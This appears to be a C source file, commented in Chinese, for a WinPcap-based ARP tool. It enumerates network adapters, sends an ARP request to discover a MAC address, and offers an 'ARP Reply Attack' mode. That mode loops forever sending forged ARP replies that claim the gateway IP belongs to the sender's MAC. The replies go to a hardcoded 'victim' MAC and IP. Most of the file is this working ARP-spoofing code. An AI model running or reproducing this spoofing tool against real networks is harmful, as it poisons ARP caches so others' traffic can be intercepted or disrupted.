#include"stdio.h"
#include"winsock2.h"

#define HAVE_REMOTE
#include "pcap.h"   //Winpcap :)
#include "packet32.h"
#include "ntddndis.h"
#pragma comment(lib , "ws2_32.lib") //For winsock
#pragma comment(lib , "wpcap.lib") //For winpcap
#pragma comment(lib , "Packet.lib") //For winpcap

#define EPT_ARP 0x0806                 //定義了一些在結構包的時候要用到的常量
#define EPT_IP 0x0800
#define ARP_HARDWARE 0X0001
#define ARP_REPLY 0x0002
#define ARP_REQUEST 0x0001

#pragma pack(push,1)                 //在定一結構的時候一定要用到pack(push,1)和下面的pack(pop)
//否则你構造的結構的長度會有問題

typedef struct mac{
	UCHAR byte[6];
}MAC,*PMAC;

typedef struct ethhdr             //乙太網路頭，長度14
{
	unsigned char dst[6];        //目的地MAC地址
	unsigned char src[6];        //來源的MAC地址
	unsigned short type;         //類型
}ETHHDR,*PETHDHR;

typedef struct eth_arphdr        //乙太網路arp字段長度28
{
	unsigned short arp_hrd;      //硬體類型( 16 bits)
	unsigned short arp_pro;      //協議類型( 16 bits)
	unsigned char   arp_hln;     //硬體地址長度（6 bits）
	unsigned char   arp_pln;     //協議地址長度（4 bits）
	unsigned short arp_op;       //回應還是請求 (16 bits)

	unsigned char arp_sha[6];   //傳送端MAC地址(長度不定)
	unsigned long arp_spa;       //傳送端的IP地址(長度不定)
	unsigned char arp_tha[6];   //接收者MAC地址(長度不定)
	unsigned long arp_tpa;       //接收端的IP地址(長度不定)
	unsigned char padding[18];//填充
}ETH_ARPHDR,*PETH_ARPHDR;

typedef struct arp                   //整個ARP包的結構
{
	ETHHDR ethhdr;
	ETH_ARPHDR eth_arp;
}ARP,*PARP;

//Gobal Param
ETHHDR* ethhdr;
ETH_ARPHDR * ARPReply;
ARP arpPacket;
char hex[6] = {'A','B','C','D','E','F'};

/**
* 獲得網路卡的MAC
* pDevName 網卡的設備名稱
*/
unsigned char* GetSelfMac(char* pDevName);

/**
*初始化Arp Request封包
**/
void InitARPRequestPackage(UCHAR* MAC,ULONG Src_IP,ULONG Dst_IP);

/**
*初始化Arp Reply封包
**/
void InitARPReplyPackage(UCHAR* MyMAC,PMAC VictimMAC ,ULONG Src_IP,ULONG Dst_IP);

/**
*把網卡印出來
**/
void PrintHexDecimal(UCHAR* MAC);

int main (int argc,char* argv[])
{
	ULONG Src_IP, Dst_IP;
	int count=0;
	PMAC Victim_MAC = NULL;
	UCHAR *arpPacketage=NULL,*pkt_data=NULL,*mac=NULL,*Victim_Mac=NULL; //Local MAC
	u_int i, res , inum,choice ;
	time_t seconds;
	struct tm tbreak;
	struct pcap_pkthdr *header;
	char errbuf[PCAP_ERRBUF_SIZE],timestr[100];
	pcap_if_t *alldevs, *d;
	pcap_t *fp;

	/* The user didn't provide a packet source: Retrieve the local device list */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
		return -1;
	}
	i = 0;
	/* Print the list */
	for(d=alldevs; d; d=d->next)
	{
		printf("%d. %s\n    ", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i==0)
	{
		fprintf(stderr,"No interfaces found! Exiting.\n");
		return -1;
	}
	//選擇網卡執行接下來的程序
	printf("Enter the interface number you would like to sniff : ");
	scanf("%d" , &inum);

	if(inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

	/* Open the device */
	if ( (fp= pcap_open(d->name,// name of the device
		65536 /*portion of the packet to capture*/,
		PCAP_OPENFLAG_PROMISCUOUS /*promiscuous mode*/,
		1000 /*read timeout*/,
		NULL  /*authentication on the remote machine*/,
		errbuf // error buffer
		)) == NULL)
	{
		fprintf(stderr,"/nUnable to open the adapter. %s is not supported by WinPcap/n",d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	//初始化ARP Package
	printf("1.) ARP Requset 2.)ARP Reply Attack : ");
	scanf("%d" ,&choice);
	switch(choice)
	{
	case 1:	
		//+8以去掉"rpcap://"
		mac = GetSelfMac(d->name+8);
		printf("\nMy Mac : ");
		PrintHexDecimal(mac);
		Src_IP = inet_addr("203.64.84.139");
		Dst_IP = inet_addr("203.64.84.174");
		//Dst_IP = inet_addr("203.64.84.144");
		InitARPRequestPackage(mac,Src_IP,Dst_IP);
		break;
	case 2:
		mac = GetSelfMac(d->name+8);
		Src_IP = inet_addr("203.64.84.1");
		//Dst_IP = inet_addr("203.64.84.152");
		Dst_IP = inet_addr("203.64.84.136");
		Victim_MAC = (PMAC) malloc(sizeof(MAC));
		Victim_MAC->byte[0] = 0x08;
		Victim_MAC->byte[1] = 0x60;
		Victim_MAC->byte[2] = 0x6E;
		Victim_MAC->byte[3] = 0x48;
		Victim_MAC->byte[4] = 0x18;
		Victim_MAC->byte[5] = 0x3E;
	/*	Victim_MAC->byte[0] = 0x08;
		Victim_MAC->byte[1] = 0x60;
		Victim_MAC->byte[2] = 0x6E;
		Victim_MAC->byte[3] = 0x48;
		Victim_MAC->byte[4] = 0x1D;
		Victim_MAC->byte[5] = 0x30;*/
		InitARPReplyPackage(mac,Victim_MAC,Src_IP,Dst_IP);
		free(Victim_MAC);

		arpPacketage =(UCHAR *) malloc(sizeof(arpPacket));
		memcpy(arpPacketage, &arpPacket, sizeof(arpPacket));
		/* Send down the packet */
		while (1)
		{
			if(pcap_sendpacket(fp, arpPacketage, sizeof(arpPacket)) != 0){
				printf("\nError sending the packet: \n", pcap_geterr(fp));
				break;
			}
			++count;
			printf("\nArp Reply count : %d",count);
		}
		break;
	}
	arpPacketage =(UCHAR *) malloc(sizeof(arpPacket));
	memcpy(arpPacketage, &arpPacket, sizeof(arpPacket));

	/* Send down the packet */
	if (pcap_sendpacket(fp, arpPacketage, sizeof(arpPacket) /* size */) != 0)
	{
		printf("\nError sending the packet: \n", pcap_geterr(fp));
		return;
	}

	free(arpPacketage);
	/* Retrieve the packets */
	while((res = pcap_next_ex( fp, &header, &pkt_data)) >= 0)
	{
		if(res == 0)
			// Timeout elapsed
				continue;
		/* convert the timestamp to readable format */
		seconds = header->ts.tv_sec;
		localtime_s( &tbreak , &seconds);
		strftime (timestr , 80 , "%d-%b-%Y %I:%M:%S %p" , &tbreak );
		//printf("%s,%.6d len:%d\n", timestr, header->ts.tv_usec, header->len);
		//Ethernet header
		ethhdr = (ETHHDR *)pkt_data;
		if(ntohs(ethhdr->type) == EPT_ARP){	
			ARPReply = (ETH_ARPHDR *) (pkt_data+sizeof(ETHHDR));	
			if(ARPReply->arp_spa==Dst_IP){	
				printf("My_Need_MAC: ");
				PrintHexDecimal(ARPReply->arp_sha);
			}
		}
	}

	if(res == -1){
		printf("Error reading the packets: %s\n", pcap_geterr(fp));
		return -1;
	}
	/* At this point, we don't need any more the device list. Free it */
	pcap_freealldevs(alldevs);
	/* start the capture */
	return 1;
}

/**
* 獲得網路卡的MAC
* pDevName 網卡的設備名稱
*/
unsigned char* GetSelfMac(char* pDevName){
	static u_char mac[6];
	BOOLEAN Status;
	LPADAPTER lpAdapter =   PacketOpenAdapter(pDevName);
	PPACKET_OID_DATA OidData;

	memset(mac,0,sizeof(mac));
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
		return NULL;

	OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));

	if (OidData == NULL) {
		PacketCloseAdapter(lpAdapter);
		return NULL;
	}

	// 
	// Retrieve the adapter MAC querying the NIC driver
	//
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;
	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	Status = PacketRequest(lpAdapter, FALSE, OidData);

	if(Status)
		memcpy(mac,(u_char*)(OidData->Data),6);

	free(OidData);
	PacketCloseAdapter(lpAdapter);
	return mac;
}

/**
*初始化封包
**/
void InitARPRequestPackage(UCHAR* MAC,ULONG Src_IP,ULONG Dst_IP){
	int i=0;
	//乙太網路head
	//目的地MAC
	/*arpPacket.ethhdr.dst[0]=0x00;
	arpPacket.ethhdr.dst[1]=0x0F;
	arpPacket.ethhdr.dst[2]=0xE2;
	arpPacket.ethhdr.dst[3]=0xD5;
	arpPacket.ethhdr.dst[4]=0xAD;
	arpPacket.ethhdr.dst[5]=0xDF;*/
	memset(arpPacket.ethhdr.dst,0xFF,6); 
	//來源端MAC
	for(i=0;i<6;i++)
		arpPacket.ethhdr.src[i]=(int)MAC[i]; 
	//乙太網路的TYPE
	arpPacket.ethhdr.type=htons(EPT_ARP);

	//ARP 封包部分
	//硬件類型，Ethernet是0x0001
	arpPacket.eth_arp.arp_hrd=htons(ARP_HARDWARE);
	//協議類型，IP為0x0800
	arpPacket.eth_arp.arp_pro=htons(EPT_IP);
	//MAC長度為0x06
	arpPacket.eth_arp.arp_hln=0x06;
	//IP長度為0x04
	arpPacket.eth_arp.arp_pln=0x04;
	//操作：ARP請求為0x0001
	arpPacket.eth_arp.arp_op=htons(ARP_REQUEST);
	//Source MAC 與 IP 
	for(i=0;i<6;i++)
		arpPacket.eth_arp.arp_sha[i]=(int)MAC[i]; 
	arpPacket.eth_arp.arp_spa=Src_IP; 

	//Target MAC 與 IP
	memset(arpPacket.eth_arp.arp_tha,0x00,6); 
	arpPacket.eth_arp.arp_tpa=Dst_IP; 
	//填充數據，18B
	memset(arpPacket.eth_arp.padding,0,18);
}

/**
*初始化Arp Reply封包
**/
void InitARPReplyPackage(UCHAR* MyMAC,PMAC VictimMAC ,ULONG Src_IP,ULONG Dst_IP){
	int i=0;
	//乙太網路head
	//目的地MAC
	//memset(arpPacket.ethhdr.dst,0xFF,6); 
	for(i=0;i<6;i++)
		arpPacket.ethhdr.dst[i]=(int)VictimMAC->byte[i];
	//我的MAC
	for(i=0;i<6;i++)
		arpPacket.ethhdr.src[i]=(int)MyMAC[i]; 
	//乙太網路的TYPE
	arpPacket.ethhdr.type=htons(EPT_ARP);

	//ARP 封包部分
	//硬件類型，Ethernet是0x0001
	arpPacket.eth_arp.arp_hrd=htons(ARP_HARDWARE);
	//協議類型，IP為0x0800
	arpPacket.eth_arp.arp_pro=htons(EPT_IP);
	//MAC長度為0x06
	arpPacket.eth_arp.arp_hln=0x06;
	//IP長度為0x04
	arpPacket.eth_arp.arp_pln=0x04;
	//操作：ARP請求為0x0001
	arpPacket.eth_arp.arp_op=htons(ARP_REPLY);
	//我的MAC 與 Switch的 IP
	for(i=0;i<6;i++)
		arpPacket.eth_arp.arp_sha[i]=(int)MyMAC[i]; 
	arpPacket.eth_arp.arp_spa=Src_IP; 

	//被害者的 MAC 
	for(i=0;i<6;i++)
		arpPacket.eth_arp.arp_tha[i]=(int) VictimMAC->byte[i];

	//被害者的IP
	arpPacket.eth_arp.arp_tpa=Dst_IP; 
	//填充數據，18B
	memset(arpPacket.eth_arp.padding,0,18);
}

/**
*把10進位的mac印出
**/
void PrintHexDecimal(UCHAR* MAC){
	int i=0,Temp=0;
	char temp[3]={0};
	for(;i<6;i++){
		Temp=MAC[i]/16;
		if(Temp>9)
			temp[0] = hex[Temp-10];		
		else
			temp[0]=Temp+'0';
		Temp=0;
		//餘數
		Temp = MAC[i]%16;
		if(Temp>9)
			temp[1] = hex[Temp-10];
		else
			temp[1] = Temp+'0';
		if(i!=5)
			printf("%s:",temp);
		else
			printf("%s\n",temp);
	}
}